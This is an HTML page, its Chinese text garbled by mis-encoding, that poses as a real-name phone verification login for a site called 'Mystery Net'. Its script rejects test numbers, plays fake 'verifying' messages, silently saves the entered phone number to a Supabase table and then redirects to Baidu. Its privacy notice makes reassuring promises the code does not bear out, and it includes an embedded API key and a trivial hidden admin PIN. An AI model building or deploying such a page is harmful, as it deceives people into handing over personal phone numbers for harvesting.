<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>æ¬¢è¿ç™»å½•ç¥ç§˜ç½‘</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --gold: #c6a35f; --bg: #0a0a0a; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .box { width: 85%; max-width: 320px; text-align: center; border: 1px solid #222; padding: 30px 20px; border-radius: 20px; background: #111; position: relative; }
        .radar { width: 60px; height: 60px; border: 2px solid var(--gold); border-radius: 50%; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; position: relative; }
        .radar::after { content: ""; width: 100%; height: 100%; border: 2px solid var(--gold); border-radius: 50%; position: absolute; animation: p 2s infinite; opacity: 0; }
        @keyframes p { 0% { transform: scale(1); opacity: 0.5; } 100% { transform: scale(1.6); opacity: 0; } }
        h2 { font-size: 19px; letter-spacing: 1px; margin-bottom: 10px; }
        p { font-size: 12px; color: #cdcdcd; line-height: 1.6; margin-bottom: 25px; }
        .input-group { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; margin-bottom: 20px; }
        input { width: 100%; background: transparent; border: none; padding: 15px 0; color: #fff; font-size: 18px; outline: none; text-align: center; }
        .btn { width: 100%; padding: 16px; background: var(--gold); color: #000; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .btn:disabled { background: #444; color: #888; cursor: not-allowed; }
        #log { font-size: 10px; color: var(--gold); margin-top: 15px; font-family: monospace; min-height: 14px; }
        
        /* éšç§æ”¿ç­–æ ·å¼ */
        .privacy-link { font-size: 10px; color: #888; text-decoration: none; margin-top: 15px; display: block; line-height: 1.4; }
        #privacy-text { display: none; font-size: 10px; color: #666; text-align: left; margin-top: 15px; padding: 10px; border-top: 1px dashed #222; }
        
        .dot { margin-top: 50px; color: #111; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <div id="ui-main">
        <div class="radar">ğŸ’¡</div>
        <h2>æ¬¢è¿ç™»å½•ç¥ç§˜ç½‘</h2>
        <p>ç³»ç»Ÿå°†è‡ªåŠ¨æ¯”å¯¹è®¾å¤‡ç‰¹å¾ä¸å®åæ•°æ®åº“ã€‚è¯·ç¡®ä¿å¡«å†™çš„æ‰‹æœºå·ä¸ºæ‚¨æœ¬äººçš„å®åå·ç ã€‚</p>
        <div class="input-group">
            <input type="tel" id="u-phone" placeholder="è¾“å…¥11ä½æ‰‹æœºå·" maxlength="11">
        </div>
        <button class="btn" id="btn-run" onclick="verify()">ç«‹å³ç™»å½•</button>
        <div id="log"></div>
        
        <a href="javascript:void(0)" class="privacy-link" onclick="togglePrivacy()">æ ¸éªŒå³ä»£è¡¨æ‚¨åŒæ„ã€Šéšç§å…è´£æ¡æ¬¾ã€‹<br>(ç‚¹å‡»æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯)</a>
        <div id="privacy-text">
            æˆ‘ä»¬ç«­åŠ›ä¿æŠ¤æ‚¨çš„éšç§å®‰å…¨ï¼š<br>
            1. æ”¶é›†ä¿¡æ¯ä»…ç”¨äºèº«ä»½æ ¸éªŒï¼Œä¸ä¼šå‘ç¬¬ä¸‰æ–¹æ³„éœ²ã€‚<br>
            2. æˆ‘ä»¬é‡‡ç”¨åŠ å¯†ä¼ è¾“åè®®ä¿éšœæ‚¨çš„å·ç å®‰å…¨ã€‚<br>
            3. ä½¿ç”¨æœ¬æœåŠ¡å³ä»£è¡¨æ‚¨åŒæ„æˆ‘ä»¬çš„æœåŠ¡åè®®ã€‚<br>
            4. ç«™ç‚¹å†…å®¹ä»…ä¾›æŠ€æœ¯æµ‹è¯•ï¼Œä¸äº§ç”Ÿæ³•å¾‹æ•ˆåŠ›ã€‚<br>
            5. ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯å°†è¢«ä¸¥æ ¼ä¿å¯†å¹¶å­˜å‚¨åœ¨ Supabase åŠ å¯†åº“ä¸­ã€‚<br>
            6. è·³è½¬åçš„é¡µé¢ä¸æœ¬ç½‘ç«™æ— å…³ï¼Œè¯·æ³¨æ„ç”„åˆ«ã€‚<br>
            7. æœ¬ç«™ç‚¹ä¸å¯¹å› ä½¿ç”¨æœ¬æœåŠ¡è€Œäº§ç”Ÿçš„ä»»ä½•æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚<br>
            8. è”ç³»ä¸ç”³è¯‰ï¼šå¯é€šè¿‡ GitHub é¡¹ç›®é¡µæäº¤ Issueã€‚<br>
        </div>
    </div>
    <div class="dot" onclick="clickDot()">.</div>
</div>

<script>
    // é…ç½®
    const MY_URL = 'https://wzowdkjzitwjmacirofy.supabase.co'; 
    const MY_KEY = 'sb_publishable_vUkpj6iL4DNNwSH3S7w6xQ_qifNETLn';
    const REDIRECT_URL = 'https://www.baidu.com'; 

    let client = window.supabase.createClient(MY_URL, MY_KEY);
    let startTime = new Date();

    function togglePrivacy() {
        const t = document.getElementById('privacy-text');
        t.style.display = t.style.display === 'block' ? 'none' : 'block';
    }

    async function verify() {
        const phone = document.getElementById('u-phone').value;
        const log = document.getElementById('log');
        const btn = document.getElementById('btn-run');

        // 1. åŸºç¡€æ ¼å¼æ ¡éªŒ (2026æœ€æ–°å·æ®µ)
        const proRegex = /^(?:(?:\+|00)86)?1(?:3[\d]|4[5-9]|5[0-3,5-9]|6[2567]|7[0-8]|8[\d]|9[0-3,5-9])\d{8}$/;
        
        // 2. æ·±åº¦ç‰¹å¾æ ¡éªŒï¼šæ‹¦æˆªè¿å·å’Œé«˜é‡å¤å· (å¦‚ 186...8888)
        const checkPattern = (p) => {
            const tail = p.slice(-5); // æ£€æŸ¥æœ«å°¾5ä½
            const repeated = /^(.)\1{4}$/.test(tail); // æ£€æŸ¥æ˜¯å¦ä¸º AAAAA å‹
            const sequential = "0123456789".includes(tail) || "9876543210".includes(tail); // æ£€æŸ¥æ˜¯å¦ä¸º 12345 å‹
            return repeated || sequential;
        };

        const spyList = ["13800138000", "18601654433", "11111111111", "12345678901"];

        if (!proRegex.test(phone)) {
            alert("âš ï¸ æ¥å…¥å¤±è´¥ï¼šæœªæ£€æµ‹åˆ°åˆæ³•çš„ä¸­å›½è¿è¥å•†å®åå·æ®µ");
            return;
        }

        if (spyList.includes(phone) || checkPattern(phone)) {
            alert("âš ï¸ å®‰å…¨è­¦å‘Šï¼šæ£€æµ‹åˆ°å¼‚å¸¸å·ç ç‰¹å¾ã€‚è¯·ç¡®ä¿ä½¿ç”¨æœ¬äººå®åå·ç ï¼Œç¦æ­¢ä½¿ç”¨æµ‹è¯•å·ã€‚");
            return;
        }

        if ((new Date() - startTime) < 3000) {
            alert("âš ï¸ æ“ä½œè¿‡å¿«ï¼šç³»ç»Ÿæ­£åœ¨åˆå§‹åŒ–å®‰å…¨é“¾è·¯ï¼Œè¯·ç¨å");
            return;
        }

        // 3. æ¨¡æ‹Ÿæ ¸éªŒæµç¨‹
        btn.disabled = true;
        const steps = ["æ­£åœ¨è¿æ¥åŠ å¯†ç½‘å…³...", "æ£€ç´¢å·æ®µå½’å±åœ°...", "æ¯”å¯¹è®¾å¤‡å®åç‰¹å¾...", "æ ¸éªŒé€šè¿‡ï¼Œæ­£åœ¨å®‰å…¨è·³è½¬..."];
        
        for (let i = 0; i < steps.length; i++) {
            log.innerText = steps[i];
            await new Promise(r => setTimeout(r, 800));
            if (i === 1) {
                // å°†æ•°æ®å®‰å…¨å½•å…¥ Supabase
                await client.from('logins').insert([{ phone: phone }]);
            }
        }
        
        window.location.href = REDIRECT_URL;
    }

    let taps = 0;
    function clickDot() {
        if (++taps >= 5) {
            const p = prompt("PIN:");
            if (p === "123456") alert("ç®¡ç†å‘˜æ¨¡å¼å·²æ¿€æ´»");
        }
    }
</script>
</body>
</html>